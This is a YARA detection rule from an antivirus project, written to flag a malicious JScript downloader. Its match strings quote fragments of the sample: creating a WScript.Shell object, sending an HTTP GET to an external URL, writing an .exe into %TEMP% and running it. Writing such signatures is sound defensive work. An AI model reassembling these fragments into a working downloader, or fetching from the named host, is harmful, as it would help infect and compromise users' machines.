rule sig_20160401_9808341ba2357396dcac5eb68e2a0877 {
  meta:
    description = "datamaliciousorder - file 20160401_9808341ba2357396dcac5eb68e2a0877.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d1f63961498cc57ba3ec23afd073a0101eb61dc94cc4510722d681dc57876865"

  strings:
    $s1  = "function TzBqt(WvGp, WqsUf){XdPw = XdPw * 1; return WvGp - WqsUf;};" fullword ascii
    $s2  = "var WnzHpx = function VrFu() {return WScript[AfsEc](\"WScript\"+\".Shell\");}(), VflDa = 11;" fullword ascii
    $s3  = "VsZqn[MgwPc](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s4  = "if (VsZqn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function FktBwu() {return WnzHpx[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"yhjnhQ2T.ex\" + \"e\";};" fullword ascii
    $s6  = "function DnHwd(){return NhhKed + \"\";};" fullword ascii
    $s7  = "function KdJi() {return ((ScrRo == true) && (ScrRo == HdzTe)) ? 1 : XdPw;};" fullword ascii
    $s8  = "var LwyTt = false;" fullword ascii
    $s9  = "var ScrRo = false;" fullword ascii
    $s10 = "function QagMji(MaAt){WnzHpx[\"R\"+\"un\"](MaAt, XdPw, XdPw);};" fullword ascii
    $s11 = "function BdGj(){return 23;};" fullword ascii
    $s12 = "var AgDa = new this[\"Date\"]();" fullword ascii
    $s13 = "var HdzTe = false;" fullword ascii
    $s14 = "function FteBzv(ZpjZb) {var PcPrb = (1, 2, 3, 4, 5, ZpjZb); return PcPrb;};" fullword ascii
    $s15 = "ScrRo = true; " fullword ascii
    $s16 = "}while (NdbSqd);" fullword ascii
    $s17 = "return TzBqt(ZmIy, DxkHk);" fullword ascii
    $s18 = "HdzTe = true; " fullword ascii
    $s19 = "function WteUym(){return AfsEc;};" fullword ascii
    $s20 = "function CadUsb()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}